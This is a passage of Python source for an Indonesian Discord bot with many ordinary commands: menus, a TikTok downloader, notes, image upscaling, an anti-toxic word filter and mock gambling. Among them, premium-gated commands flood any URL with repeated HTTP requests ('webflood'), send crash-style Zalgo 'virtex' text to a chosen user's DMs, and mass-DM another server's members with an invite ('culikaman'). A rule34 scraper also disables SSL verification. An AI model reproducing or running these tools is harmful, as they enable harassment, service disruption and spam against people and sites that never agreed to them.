        all_files = subprocess.check_output("ls", shell=True).decode().split("\n")
        files_to_zip = [f for f in all_files if f and f not in EXCLUDE_FILES]

        if not files_to_zip:
            return await msg.edit(content="⚠️ | Tidak ada file yang bisa di-backup!")

        # Membuat file zip
        with zipfile.ZipFile(ZIP_NAME, "w", zipfile.ZIP_DEFLATED) as zipf:
            for file in files_to_zip:
                if os.path.isdir(file):
                    for root, dirs, files in os.walk(file):
                        for f in files:
                            zipf.write(os.path.join(root, f))
                else:
                    zipf.write(file)

        # Embed pemberitahuan selesai
        embed_done = discord.Embed(
            title="✅ Backup Berhasil!",
            description="Script berhasil dibackup dan dikirim ke DM kamu!",
            color=discord.Color.green()
        )

        # Kirim file zip ke DM pengguna
        try:
            await ctx.author.send(
                embed=discord.Embed(
                    title="Backup Script",
                    description="Berikut adalah hasil backup script bot kamu.",
                    color=discord.Color.blue()
                ),
                file=discord.File(ZIP_NAME)
            )
            await msg.edit(embed=embed_done)

            if ctx.channel.type != discord.ChannelType.private:
                await ctx.reply("ℹ️ | Cek DM kamu untuk menerima file script.")
        except discord.Forbidden:
            await msg.edit(content="❌ | Gagal mengirim ke DM, pastikan DM kamu tidak dikunci!")

        # Hapus file zip setelah dikirim
        if os.path.exists(ZIP_NAME):
            os.remove(ZIP_NAME)

    except Exception as e:
        await ctx.reply(f"⚠️ | Terjadi error saat backup: `{e}`")
    
#webflood
@bot.command()
async def webflood(ctx, url: str, jumlah: int = 10, delay: float = 1.0):
    # cek role Premium
    role_names = [role.name for role in ctx.author.roles]
    if "Premium" not in role_names:
        await ctx.send("maaf sayang, cuma yang punya role **Premium** yang bisa pakai command ini yaa~")
        return

    await ctx.send(f"mulai flood ke `{url}` sebanyak {jumlah} kali~")
    success = 0
    failed = 0

    for i in range(jumlah):
        try:
            res = requests.get(url, timeout=5)
            if res.status_code == 200:
                success += 1
                await ctx.send(f"[{i+1}] Sukses ({res.status_code})")
            else:
                failed += 1
                await ctx.send(f"[{i+1}] Gagal ({res.status_code})")
        except Exception as e:
            failed += 1
            await ctx.send(f"[{i+1}] Error: {str(e)}")
        await asyncio.sleep(delay)
    
    await ctx.send(f"selesai yaa sayangg~ sukses: {success}, gagal: {failed}")

# culik aman
def is_owner():
    async def predicate(ctx):
        role = discord.utils.get(ctx.guild.roles, name="Owner")
        return role in ctx.author.roles
    return commands.check(predicate)

@bot.command()
@is_owner()
async def culikaman(ctx, *, arg=None):
    if not arg or '|' not in arg:
        return await ctx.send("❌ Format salah!\nContoh: `.culikaman idServerAsal|idChannelTujuan`")

    from_guild_id, to_channel_id = [x.strip() for x in arg.split('|')]
    from_guild = bot.get_guild(int(from_guild_id))
    to_channel = bot.get_channel(int(to_channel_id))

    if not from_guild or not to_channel:
        return await ctx.send("❌ ID Server/Channel salah atau bot tidak ada di server tersebut.")

    invite = await to_channel.create_invite(max_uses=1, unique=True)
    members = [m for m in from_guild.members if not m.bot]
    total = len(members)

    await ctx.send(f"🚀 Mulai culik aman!\n📊 Total: {total} member\n📨 Kirim link invite lewat DM")

    for i, member in enumerate(members, start=1):
        try:
            await member.send(
                f"Halo {member.name}, kamu diundang masuk ke server baru nih: {invite.url}"
            )
            await asyncio.sleep(2)
        except:
            print(f"❌ Gagal kirim DM ke {member.name}")
        if i % 10 == 0:
            await ctx.send(f"✅ DM terkirim ke {i} member")

    await ctx.send("✅ Semua target sudah dikirimin link invite~")
    
#sistem menu
@bot.command()
async def menu(ctx):
    member = ctx.author

    hour = datetime.now().hour
    greeting = (
        "☀️ Selamat pagi" if 4 <= hour < 10 else
        "🌤️ Selamat siang" if 10 <= hour < 15 else
        "🌇 Selamat sore" if 15 <= hour < 18 else
        "🌙 Selamat malam"
    )

    embed = discord.Embed(
        title=f"Halo {member.name}!",
        description=f"{greeting}, Haloo kak {member.mention}\nmenu nya sudah siap silahkan di klik 🤗✨",
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
    embed.set_footer(text=f"Bot berjalan di {member.guild.name}")
    embed.timestamp = datetime.now(timezone.utc)

    # Fungsi callback untuk tombol allmenu
    async def allmenu_callback(interaction):
        allmenu_command = bot.get_command("allmenu")
        if allmenu_command:
            await allmenu_command(ctx)

    # tombol rules & allmenu
    view = discord.ui.View()

    button_allmenu = discord.ui.Button(label="⚙️ allmenu", custom_id="allmenu")
    button_allmenu.callback = allmenu_callback
    view.add_item(button_allmenu)

    view.add_item(discord.ui.Button(label="📜 rules", url="https://discord.com/channels/1338549099070357649/1338549099737124885/1363122636015665152"))

    # Kirim embed + view ke channel tempat command diketik
    await ctx.channel.send(embed=embed, view=view)
 
#total fitur
@bot.command()
async def totalfitur(ctx):
    member = ctx.author
    total = len(bot.commands)

    hour = datetime.now().hour
    greeting = (
        "☀️ Selamat pagi" if 4 <= hour < 10 else
        "🌤️ Selamat siang" if 10 <= hour < 15 else
        "🌇 Selamat sore" if 15 <= hour < 18 else
        "🌙 Selamat malam"
    )

    embed = discord.Embed(
        title=f"Halo {member.name}!",
        description=f"{greeting}, kak {member.mention}!\nTotal fitur yang tersedia di bot **X Y N O R A** adalah `{total}` fitur.",
        color=discord.Color.green()
    )
    embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
    embed.set_footer(text=f"Bot berjalan di {member.guild.name}")
    embed.timestamp = datetime.now(timezone.utc)

    await ctx.send(embed=embed)
       
# top
@bot.command()
async def topmessage(ctx):
    channel = ctx.channel
    message_counts = {}

    today = datetime.now(timezone.utc).date()

    async for message in channel.history(limit=None):
        if message.author.bot:
            continue
        if message.content.startswith("/"):
            continue
        if message.created_at.date() != today:
            continue

        author_id = message.author.id
        if author_id not in message_counts:
            message_counts[author_id] = 0
        message_counts[author_id] += 1

    if not message_counts:
        return await ctx.send("Belum ada pesan hari ini yang bisa dihitung sayanggg.")

    sorted_counts = sorted(message_counts.items(), key=lambda x: x[1], reverse=True)

    teks = ""
    for user_id, count in sorted_counts:
        user = await bot.fetch_user(user_id)
        teks += f"{user.mention} -> {count} Pesan\n"

    await ctx.send(teks)
	
# Noted Menu   
@bot.command()
async def noted(ctx):
    menu_text = """
**✧━━━━━━[ *Menu* ]━━━━━━━✧**
    
1. `/notes <melihat catatan>`
2. `/note <pesan>`
3. `/delnote <pesan>`
4. `/opennote <owner access>`
5. `/closenote <owner access>`
  
**✧━━━━[ *Thank You* ]━━━━━━✧**
`Pesan otomatis jangan di replay`
"""

    embed = discord.Embed(
        description=menu_text,
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1362671538503024691/6642c429a34ce2c4fdbd17bf271e2b6c.jpg?ex=68033e43&is=6801ecc3&hm=174d0c310883f861f64378c4821838371c765fc6a5ece9fc34fdc6aaf0234dc1&")  # Ganti URL ini kalo kamu mau foto lain
    embed.set_footer(text="Powered By Replit")

    await ctx.send(embed=embed)
    
#sistem virtex
@bot.command()
async def virtex(ctx, user: discord.User):
    # Cek apakah user punya role "Premium"
    if not any(role.name.lower() == "premium" for role in ctx.author.roles):
        await ctx.send("Fitur ini hanya untuk user **Premium**.")
        return
    
    # Tentukan path file yang menyimpan pesan Zalgo
    file_path = "./api/api-virtex.txt"

    # Pastikan file ada
    if not os.path.exists(file_path):
        await ctx.send("File Zalgo gak ditemukan.")
        return

    try:
        # Baca pesan Zalgo dari file
        with open(file_path, "r", encoding="utf-8") as f:
            pesan = f.read()

        # Kirim pesan Zalgo ke user yang dituju
        await user.send(pesan)
        await ctx.send(f"Berhasil kirim virtex ke {user.name}")

    except Exception as e:
        await ctx.send(f"Error saat mengirim DM: {e}")
        
#Sistem tiktok
user_data = {}

LIMIT_MAX = 10
BAN_TIME = 5 * 60 * 60  # 5 jam (dalam detik)

def is_banned(user_id):
    data = user_data.get(user_id, {})
    if data.get('banned_until', 0) > time.time():
        return True
    return False

def update_limit(user_id):
    now = time.time()
    data = user_data.setdefault(user_id, {'limit': 0, 'reset': now + BAN_TIME})
    
    # reset limit kalau udah lebih dari 5 jam
    if now > data['reset']:
        data['limit'] = 0
        data['reset'] = now + BAN_TIME

    data['limit'] += 1

    # kalau limit melebihi batas, langsung ban
    if data['limit'] > LIMIT_MAX:
        data['banned_until'] = now + BAN_TIME
        return False
    return True

@bot.command()
async def tiktok(ctx, url: str = None):
    user_id = str(ctx.author.id)

    if is_banned(user_id):
        await ctx.send('⛔ Kamu dibanned karena spam. Tunggu 5 jam yaa sebelum bisa pake bot lagi.')
        return

    if not update_limit(user_id):
        await ctx.send('⛔ Kamu udah spam 10x, dibanned 5 jam.')
        return

    if not url:
        await ctx.send('📌 Masukin link TikToknya dong!\nContoh: `.tiktok https://www.tiktok.com/@user/video/123456`')
        return

    await ctx.send('⏳ Tunggu bentar yaa, videonya lagi diambil...')

    try:
        res = requests.get(f'https://api.nekorinn.my.id/downloader/tikwm?url={url}')
        data = res.json()

        if not data.get('status') or not data['result'].get('videoUrl'):
            await ctx.send('❌ Gagal ambil data videonya!')
            return

        result = data['result']
        video_url = result['videoUrl']
        filename = 'tiktok_temp.mp4'

        with open(filename, 'wb') as f:
            f.write(requests.get(video_url).content)

        caption = f"""**TIKTOK DOWNLOADER**
👤 Author: {result['author']['name']} (@{result['author']['username']})
🎶 Sound: {result['music_info']['title']} - {result['music_info']['author']}
📝 Title: {result['title']}
📆 Upload: {result['create_at']}
▶️ Views: {result['stats']['play']}
❤️ Likes: {result['stats']['like']}
💬 Comments: {result['stats']['comment']}
🔁 Shares: {result['stats']['share']}"""

        await ctx.send(file=discord.File(filename), content=caption)
        os.remove(filename)

    except Exception as e:
        print('[ERROR]', e)
        await ctx.send('❌ Terjadi kesalahan waktu download video.')
        
# SISTEM CEK LIMIT TIK TOK
@bot.command()
async def limit(ctx):
    user_id = str(ctx.author.id)
    data = user_data.get(user_id, {'limit': 0, 'reset': time.time() + BAN_TIME})

    if is_banned(user_id):
        sisa = int((user_data[user_id]['banned_until'] - time.time()) / 60)
        await ctx.send(f'⛔ Kamu sedang dibanned karena spam. Tunggu {sisa} menit lagi yaa.')
        return

    sisa_limit = max(0, LIMIT_MAX - data['limit'])
    sisa_menit = int((data['reset'] - time.time()) / 60)
    await ctx.send(f'⚡ Sisa limit kamu: **{sisa_limit}** dari {LIMIT_MAX}\n⏳ Reset dalam: {sisa_menit} menit')

  #sistem hd    
async def upload_to_catbox(image_bytes):
    url = 'https://catbox.moe/user/api.php'
    data = aiohttp.FormData()
    data.add_field('reqtype', 'fileupload')
    data.add_field('fileToUpload', image_bytes, filename='image.jpg', content_type='image/jpeg')

    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=data) as resp:
            text = await resp.text()
            if not text.startswith("https://"):
                raise Exception("Upload ke Catbox gagal")
            return text.strip()

def get_size_format(bytes_size):
    return f"{bytes_size / 1024:.2f} KB"

@bot.command(name='hd', help='Upscale gambar menjadi HD')
async def hd(ctx):
    if not ctx.message.attachments:
        await ctx.send("Kirim gambar sebagai attachment.")
        return

    attachment = ctx.message.attachments[0]
    if not attachment.filename.endswith(('.jpg', '.jpeg', '.png')):
        await ctx.send("Format gambar tidak didukung. Harus .jpg, .jpeg, atau .png")
        return

    await ctx.send("⏳ Sedang mengupload dan memproses gambar...")

    try:
        image_data = await attachment.read()
        image_url = await upload_to_catbox(image_data)

        api_url = f"https://fastrestapis.fasturl.cloud/aiimage/upscale?imageUrl={image_url}&resize=4"

        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as res:
                if res.status != 200:
                    raise Exception("Gagal mengambil gambar HD")

                result_image = await res.read()
                file = discord.File(io.BytesIO(result_image), filename="hd.jpg")

                waktu = datetime.datetime.now().strftime('%d %B %Y, %H:%M:%S')
                size = get_size_format(len(image_data))
                author = ctx.author.display_name

                caption = f"**Author :** {author}\n" \
                          f"**Size      :** {size}\n" \
                          f"**Waktu :** {waktu}"

                await ctx.send(content=caption, file=file)

    except Exception as e:
        await ctx.send(f"❌ Gagal memproses gambar: {e}")

#/============= SISTEM MENU 2 =============/     
@bot.command()
async def menu2(ctx):
    jakarta = pytz.timezone("Asia/Jakarta")
    now = datetime.now(jakarta)
    hour = now.hour

    if 17 <= hour < 24:
        ucapanWaktu = "🌃 Selamat Malam"
    elif 15 <= hour < 17:
        ucapanWaktu = "🌄 Selamat Sore"
    elif 11 <= hour < 15:
        ucapanWaktu = "🏞️ Selamat Siang"
    elif 6 <= hour < 11:
        ucapanWaktu = "🏙️ Selamat Pagi"
    elif 4 <= hour < 6:
        ucapanWaktu = "🌆 Selamat Subuh"
    else:
        ucapanWaktu = "🌌 Selamat Dini Hari"

    tanggal = now.strftime("%A, %d %B %Y")
    ucapan = f"{ucapanWaktu} kak {ctx.author.name}, Semoga betah ya di {ctx.guild.name} 🙂‍↔️!"

    menu_text = f"""
Hai Kak {ctx.author.mention}
{ucapan}

┅═❏ *WELCOME TO SC XYNORA* ❏═┅
 ▭▬▭▬▭▬▭▬▭▬▭▬▭▬
 ═ IG : stc_ryzzz ═

 友 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Hazelnut*
 友 𝐍𝐚𝐦𝐚 𝐒𝐜𝐫𝐢𝐩𝐭 : *『XYNORA』DC Bot v1.1 Gen1*
 友 𝐕𝐞𝐫𝐬𝐢 𝐒𝐜𝐫𝐢𝐩𝐭 : *1.1*
 友 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐃𝐢𝐬𝐜𝐨𝐫𝐝.𝐩𝐲 : *2.x*
 友 𝐇𝐚𝐫𝐢 : {tanggal}
 ▭▬▭▬▭▬▭▬▭▬▭▬▭▬
 友 contact : +6285183131924
 友 tiktok : stc_fayy
 ▭▬▭▬▭▬▭▬▭▬▭▬▭▬

╭==⊱『 *MENU DUA* 』
║. ┏⊱
║═▧ `/openai <pertanyaan>`
║═▧ `/jaai <pertanyaan>`
║═▧ `/cekjodoh <nama1> <nama2>`
║═▧ `/tourl2 <foto> <file>`
║. ┗⊱
║
╰===✧

⌕ ❙❘❙❘❙❚❙❘❙❘❙❘❙❚❙❘ ⌕
『 *©XYNORA-BOTzz* 』
━━━━━━━━━━━━━━━━━━━━━━
"""
    return menu_text

#/========= ARTIFICIAL INTELLEGENTCE ========= 
@bot.command()
async def chatgpt(ctx, *, text: str = None):
    """Fitur AI pakai API dari simplebot.my.id"""
    prompt = text or (ctx.message.reference and (await ctx.channel.fetch_message(ctx.message.reference.message_id)).content) or "hai"
    api_url = f"https://api.simplebot.my.id/api/tools/openai?prompt=Kamu adalah AI yang selalu memakai bahasa Indonesia dan ceria&msg={prompt}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as resp:
                if resp.status != 200:
                    return await ctx.send("Gagal menghubungi API.")
                data = await resp.json()
                await ctx.send(data.get("result", "Tidak ada jawaban dari AI."))
    except Exception as e:
        await ctx.send(f"Terjadi kesalahan: {e}")

@bot.command()
async def jaai(ctx, *, text: str = None):
    """Njaluk wangsulan saka Jawa AI"""
    if not text:
        return await ctx.send("Tanyakan sesuatu, contoh: *jawaai cara masak nasi liwet*")

    encoded_text = urllib.parse.quote(text)
    url = f"https://api.siputzx.my.id/api/ai/joko?content={encoded_text}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return await ctx.send("Nuwun sewu, ana kesalahan nalika nyambung API Jawa AI.")
                data = await resp.json()
                await ctx.send(f"*「 JAWA AI 」*\n\n{data['data']}")
    except Exception as e:
        await ctx.send("Nuwun sewu, ana kesalahan nalika ngubungi Jawa AI.")

#/========= SISTEM LAIN NYA =========         
@bot.command()
async def tourl2(ctx):
    """Mengunggah file yang di-quote ke catbox.moe dan memberikan URL"""
    # Mendapatkan pesan yang di-quote (atau pesan yang dikirim)
    if ctx.message.reference:
        msg = await ctx.fetch_message(ctx.message.reference.message_id)
    else:
        msg = ctx.message

    # Memeriksa apakah pesan mengandung file
    if msg.attachments:
        attachment = msg.attachments[0]
        mimetype = attachment.content_type

        # Memastikan file bukan webp
        if 'webp' not in mimetype:
            await ctx.send('🕒 Menunggu unggahan...')

            try:
                # Mengunduh file
                file = await attachment.to_file()

                # Menghitung ukuran file
                file_size = attachment.size / 1024  # dalam KB
                if file_size >= 1024:
                    file_size = file_size / 1024  # dalam MB
                    file_size = f"{file_size:.2f} MB"
                else:
                    file_size = f"{file_size:.2f} KB"

                # Mengunggah ke catbox.moe
                url = 'https://catbox.moe/user/api.php'
                files = {'fileToUpload': (attachment.filename, file.fp)}
                data = {'reqtype': 'fileupload'}
                response = requests.post(url, data=data, files=files)

                # Menyaring hasil response untuk mendapatkan URL
                upload_url = response.text.strip()

                # Mengirimkan hasil URL
                caption = f"🔗 URL: {upload_url}\n\n*Ukuran:* {file_size}"
                await ctx.send(caption)

            except Exception as e:
                await ctx.send(f"[ ! ] Gagal mengunggah file. Error: {str(e)}")
        else:
            await ctx.send("File *.webp* tidak didukung. Kirim atau reply file lain.")
    else:
        await ctx.send("Tidak ada file yang di-quote atau dilampirkan.")
        
@bot.command()
async def cekjodoh(ctx, name1: str, name2: str):
    """Fitur cek jodoh berdasarkan dua nama"""
    if not name1 or not name2:
        await ctx.send('💌 Contoh: .cekjodoh <namalu> <nama orang yang lu suka>')
        return
    
    # Menghitung kecocokan cinta secara acak
    compatibility = random.randint(0, 100)
    
    # Mengirim hasil cek jodoh
    await ctx.send(f"💖 *Kecocokan Cinta*:\n\nNama kamu: {name1}\nNama pasangan kamu: {name2}\n\nKecocokan kalian: {compatibility}%")

#sistem hd video
@bot.command()
async def hdvideo(ctx):
    """Tingkatkan kualitas video dari reply"""
    temp_input_path = None
    temp_output_path = None
    try:
        if not ctx.message.reference:
            await ctx.reply("❌ Reply ke video yang mau diproses bro!")
            return

        replied_msg = await ctx.channel.fetch_message(ctx.message.reference.message_id)
        if not replied_msg.attachments:
            await ctx.reply("❌ Gak nemu video di reply-nya.")
            return

        video = replied_msg.attachments[0]
        mime = video.content_type or ''
        if not mime.startswith('video/'):
            await ctx.reply(f"❌ Format {mime} gak didukung bro.")
            return

        await ctx.reply("⏳ Lagi prosesin videonya, tunggu 2 - 4 menit ya...")

        # Simpan video sementara
        with tempfile.NamedTemporaryFile(delete=False, suffix='.mp4') as temp_input:
            temp_input.write(await video.read())
            temp_input_path = temp_input.name

        with tempfile.NamedTemporaryFile(delete=False, suffix='.mp4') as temp_output:
            temp_output_path = temp_output.name

        # Proses video
        ffmpeg.input(temp_input_path).output(
            temp_output_path,
            vf='scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
            r=60,
            preset='faster',
            crf=25,
            vcodec='libx264',
            pix_fmt='yuv420p',
            acodec='aac',
            audio_bitrate='128k'
        ).run()

        await ctx.reply("✅ Video udah ditingkatin bro!", file=discord.File(temp_output_path))

    except Exception as e:
        print("HDVideo Error:", e)
        await ctx.reply("❌ Gagal tingkatin video.")

    finally:
        if temp_input_path and os.path.exists(temp_input_path):
            os.remove(temp_input_path)
        if temp_output_path and os.path.exists(temp_output_path):
            os.remove(temp_output_path)

#SISTEM NOTEPAD
user_notes = {}

@bot.command(name='note', help='Simpan catatan. Contoh: /note Belajar Python')
async def note(ctx, *, content: str):
    uid = str(ctx.author.id)
    user_notes.setdefault(uid, []).append(content)
    await ctx.send(f"📝 Catatan disimpan, {ctx.author.display_name}!")

@bot.command(name='notes', help='Lihat semua catatan kamu')
async def notes(ctx):
    uid = str(ctx.author.id)
    notes = user_notes.get(uid, [])
    if not notes:
        await ctx.send("❌ Kamu belum punya catatan, coba ketik `/note <isi>`")
    else:
        msg = '\n'.join([f"{i+1}. {n}" for i, n in enumerate(notes)])
        await ctx.send(f"📚 Catatan milik **{ctx.author.display_name}**:\n```{msg}```")

@bot.command(name='delnote', help='Hapus catatan. Contoh: /delnote 2')
async def delnote(ctx, index: int):
    uid = str(ctx.author.id)
    notes = user_notes.get(uid, [])
    if 1 <= index <= len(notes):
        removed = notes.pop(index - 1)
        await ctx.send(f"🗑️ Catatan dihapus: `{removed}`")
    else:
        await ctx.send("❌ Nomor catatan tidak valid.")
        
#Sistem minecraft
@bot.command()
async def mcserver(ctx, jenis: str = None, ip: str = None):
    if not jenis or not ip:
        return await ctx.send(f"Contoh: `!mcserver java play.example.com`")

    jenis = jenis.lower()
    if jenis not in ['java', 'bedrock']:
        return await ctx.send("Jenis server hanya `java` atau `bedrock`")

    try:
        url = f"https://api.mcstatus.io/v2/status/{jenis}/{ip}"
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Referer": f"https://mcstatus.io/status/{jenis}/{ip}"
        }
        res = requests.get(url, headers=headers)
        data = res.json()

        if "error" in data:
            return await ctx.send(f"Gagal mengambil status server: {data['error']}")

        icon_url = None
        if data.get("icon"):
            b64data = data["icon"].replace("data:image/png;base64,", "")
            image_data = base64.b64decode(b64data)
            file = discord.File(BytesIO(image_data), filename="server-icon.png")
            icon_url = "attachment://server-icon.png"
        else:
            file = None

        embed = discord.Embed(title="🖥️ Status Server Minecraft 🖥️", color=0x00ff00)
        embed.add_field(name="Status", value="Online ✅" if data["online"] else "Offline ❌", inline=False)
        embed.add_field(name="Alamat", value=f"{data['host']}:{data['port']}", inline=False)
        embed.add_field(name="IP", value=data['ip_address'], inline=False)
        embed.add_field(name="Versi", value=data['version']['name_raw'] if data.get('version') else "Tidak diketahui", inline=False)
        embed.add_field(name="Pemain", value=f"{data['players']['online']}/{data['players']['max']}", inline=False)
        embed.add_field(name="MOTD", value=data['motd']['clean'] if data.get('motd') else "Tidak ada", inline=False)
        embed.set_footer(text=f"Terakhir diperbarui: {ctx.message.created_at.strftime('%d-%m-%Y %H:%M:%S')}")
        if icon_url:
            embed.set_thumbnail(url=icon_url)

        await ctx.send(embed=embed, file=file) if file else await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Terjadi kesalahan: `{str(e)}`")
        
# Sistem sesad simulator
async def rule34_search(query):
    headers = {
        "User-Agent": "Mozilla/5.0"
    }
    url = f"https://rule34.xxx/index.php?page=post&s=list&tags={query}"

    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async with session.get(url, headers=headers) as resp:
            html = await resp.text()

    soup = BeautifulSoup(html, 'html.parser')
    results = []

    for span in soup.select('span.thumb'):
        a_tag = span.find('a')
        img_tag = span.find('img')

        if a_tag and img_tag:
            post_id = a_tag['id'].replace('p', '')
            post_url = 'https://rule34.xxx' + a_tag['href']
            image_url = img_tag['src']
            title = img_tag.get('title', '')
            tags = img_tag.get('alt', '').split()

            results.append({
                'id': post_id,
                'link': post_url,
                'image': image_url,
                'title': title.strip(),
                'tags': tags
            })

    return results

@bot.command(name="rule34")
async def rule34_command(ctx, *, query: str = None):
    role_names = [role.name.lower() for role in ctx.author.roles]
    if "premium" not in role_names:
        return await ctx.send("akses ditolak! kamu butuh role `Premium` dulu yaaa")

    if not query:
        return await ctx.send("contoh: `!rule34 hinata_hyuga`")

    await ctx.send("lagi cari yaa, tunggu bentarr...")

    results = await rule34_search(query)
    if not results:
        return await ctx.send("gak nemu hasilnya sayangg...")

    result = random.choice(results)
    embed = discord.Embed(
        title="**Rule34 Result**",
        description=f"**Title:** {result['title'] or '-'}\n**Tags:** {', '.join(result['tags'])}\n[link ke post]({result['link']})",
        color=discord.Color.red()
    )
    embed.set_image(url=result['image'])
    await ctx.send(embed=embed)
    

# Sistem setpp
load_dotenv("./database/developer.env")
DEVELOPER_ID = int(os.getenv("DEVELOPER_ID"))

@bot.command(name="setpp", aliases=["setppbot"])
async def setpp(ctx):
    if ctx.author.id != DEVELOPER_ID:
        return await ctx.send("Kamu tidak diizinkan untuk mengganti foto profil bot! 😞")

    if not ctx.message.reference:
        return await ctx.send("Balas gambarnya yaa, bukan kirim biasa~")

    try:
        replied_msg = await ctx.channel.fetch_message(ctx.message.reference.message_id)
        if not replied_msg.attachments:
            return await ctx.send("Yang dibalas tidak ada gambarnya~")
        
        img = replied_msg.attachments[0]
        if not img.content_type.startswith("image/"):
            return await ctx.send("Itu bukan gambar yaa!")

        # Download gambar
        img_bytes = await img.read()
        with open("pp_bot.jpg", "wb") as f:
            f.write(img_bytes)

        with open("pp_bot.jpg", "rb") as f:
            await bot.user.edit(avatar=f.read())

        await ctx.send("Foto profil bot diganti yaa ✅")
    except discord.HTTPException as e:
        print(e)
        await ctx.send("Ada error waktu ganti PP-nya... coba lagi yaa")

# AntiToxic
db_dir = './database'
file_path = os.path.join(db_dir, 'antitoxic.json')
if not os.path.exists(db_dir):
    os.makedirs(db_dir)
if not os.path.exists(file_path):
    with open(file_path, 'w') as f:
        json.dump({}, f)

with open(file_path, 'r') as f:
    antitoxic_data = json.load(f)

def save_antitoxic():
    with open(file_path, 'w') as f:
        json.dump(antitoxic_data, f, indent=2)

suspended_users = {}

@bot.command(name="antitoxic")
async def toggle_antitoxic(ctx, mode=None):
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send("❌ Hanya admin yang bisa menggunakan perintah ini.")
    
    if mode == "on":
        antitoxic_data[str(ctx.guild.id)] = {"active": True, "warnings": {}, "suspend": {}}
        save_antitoxic()
        await ctx.send("✅ AntiToxic AKTIF di server ini.")
    elif mode == "off":
        if str(ctx.guild.id) in antitoxic_data:
            del antitoxic_data[str(ctx.guild.id)]
            save_antitoxic()
        await ctx.send("❌ AntiToxic NONAKTIF.")
    else:
        await ctx.send("Gunakan `/antitoxic on` atau `/antitoxic off`")

@bot.event
async def on_message(message):
    await bot.process_commands(message)
    
    if message.author.bot or not message.guild:
        return
    
    guild_id = str(message.guild.id)
    user_id = str(message.author.id)

    if guild_id in antitoxic_data and antitoxic_data[guild_id]["active"]:
        if user_id in antitoxic_data[guild_id].get("suspend", {}):
            end_time = datetime.fromisoformat(antitoxic_data[guild_id]["suspend"][user_id])
            if datetime.now() < end_time:
                try:
                    await message.delete()
                except:
                    pass
                return
            else:
                del antitoxic_data[guild_id]["suspend"][user_id]
                save_antitoxic()

        toxic_words = [
            'anjing','babi','kontol','memek','bangsat','goblok','tolol','ngentot',
            'idiot','kampret','keparat','jembut','pepek','peler','pantek','lonte',
            'setan','dajjal','asu','sinting','bodoh','bacot','tai','fuck','bitch',
            'cukimak','sialan','dongo','kimak','pler','titit','anjir','pantat',
            'njir','kntl','memk','bangke','bgst','pukimak'
        ]
        msg = message.content.lower()
        found = next((word for word in toxic_words if word in msg), None)
        if found:
            try:
                await message.delete()
            except:
                pass
            if user_id not in antitoxic_data[guild_id]["warnings"]:
                antitoxic_data[guild_id]["warnings"][user_id] = 0
            antitoxic_data[guild_id]["warnings"][user_id] += 1
            save_antitoxic()

            warn = antitoxic_data[guild_id]["warnings"][user_id]
            if warn >= 5:
                suspend_time = datetime.now() + timedelta(hours=5)
                antitoxic_data[guild_id]["suspend"][user_id] = suspend_time.isoformat()
                save_antitoxic()
                await message.channel.send(f"⛔ <@{user_id}> telah toxic 5x dan DISUSPEND selama 5 jam.")
                antitoxic_data[guild_id]["warnings"][user_id] = 0
                save_antitoxic()
            else:
                await message.channel.send(
                    f"⚠️ Kata toxic terdeteksi: **{found}**\nPeringatan ke-{warn} untuk <@{user_id}>."
                )
                
#Sistem judi halal
user_balances = {}

# Fungsi untuk memastikan user ada di penyimpanan
def ensure_user(user_id):
    if user_id not in user_balances:
        user_balances[user_id] = 0  # Set saldo awal 0 jika user belum ada

# Command saldo
@bot.command()
async def saldo(ctx):
    user_id = ctx.author.id

    # Ambil developer ID dari file
    with open('./database/developer.env', 'r') as file:
        developer_id = file.read().strip()

    # Pastikan user ada di dalam database
    ensure_user(user_id)

    # Jika user adalah developer, set saldo menjadi unlimited
    if str(user_id) == developer_id:
        balance = "Unlimited"
    else:
        # Cek apakah saldo sudah ada untuk user, jika tidak ada set ke 0
        balance = user_balances.get(user_id, 0)

    # Jika saldo 0, kamu bisa menambahkan saldo ke user tersebut
    if balance == 0 and str(user_id) != developer_id:
        # Inisialisasi saldo user yang belum ada
        user_balances[user_id] = 0
        balance = 0
    
    await ctx.send(f"<@{user_id}>, saldo kamu: {balance}")
    
# Command deposit
@bot.command()
async def deposit(ctx, jumlah: int):
    user_id = ctx.author.id
    ensure_user(user_id)
    user_balances[user_id] += jumlah
    await ctx.send(f"{ctx.author.mention}, saldo kamu nambah Rp{jumlah:,}")

# Command withdraw
@bot.command()
async def withdraw(ctx, jumlah: int):
    user_id = ctx.author.id
    ensure_user(user_id)
    balance = user_balances[user_id]
    if jumlah > balance:
        await ctx.send("Saldo kamu gak cukup~")
        return
    user_balances[user_id] -= jumlah
    await ctx.send(f"{ctx.author.mention}, saldo kamu dikurang Rp{jumlah:,}")

# Command slot
@bot.command()
async def slot(ctx, bet: int):
    user_id = ctx.author.id
    ensure_user(user_id)
    balance = user_balances[user_id]
    if bet > balance:
        await ctx.send("Saldo kamu gak cukup~")
        return
    emojis = ["🍒", "🍋", "7️⃣", "🍇", "⭐"]
    result = [random.choice(emojis) for _ in range(3)]
    if len(set(result)) == 1:
        win = bet * 5
        user_balances[user_id] += win
        result_msg = f"Kamu menang Rp{win:,}!!"
    elif len(set(result)) == 2:
        win = bet * 2
        user_balances[user_id] += win
        result_msg = f"Hampir jackpot! Menang Rp{win:,}"
    else:
        user_balances[user_id] -= bet
        result_msg = f"Kamu kalah Rp{bet:,}..."
    await ctx.send(f"{ctx.author.mention} | {' | '.join(result)}\n{result_msg}")

# Command coin
@bot.command()
async def coin(ctx, bet: int, tebakan: str):
    user_id = ctx.author.id
    ensure_user(user_id)
    balance = user_balances[user_id]
    if bet > balance:
        await ctx.send("Saldo kamu kurang~")
        return
    result = random.choice(["head", "tail"])
